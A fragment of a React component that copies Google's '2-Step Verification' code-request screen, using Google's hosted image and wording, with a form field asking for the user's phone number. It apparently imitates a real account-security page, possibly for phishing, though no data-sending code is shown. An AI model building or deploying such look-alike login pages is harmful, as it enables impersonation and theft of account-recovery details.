...
export default function NumberCode() {
	...
	return (
		<form onSubmit={handleSubmit} className={styles.form}>
			...
			<div className={styles.profile} style={{ marginBottom: '40px' }}>
			...
			<figure aria-hidden='true' data-illustration='authzenDefault'>
				...
				<img className={styles.center} src='https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif' aria-hidden='true' alt='' data-iml='80171' />
			</figure>
			<h2 style={{ marginBottom: '20px' }}>2-Step Verification</h2>
			<h2>Get a verification code</h2>
			<div className={styles.sub_title_s} style={{ marginBottom: '20px' }}>
				To get a verification code, first confirm the phone number you added to your account. Standard rates apply.
			</div>
			<Field label='Phone number' errorMessage='' onChange={() => {}} />
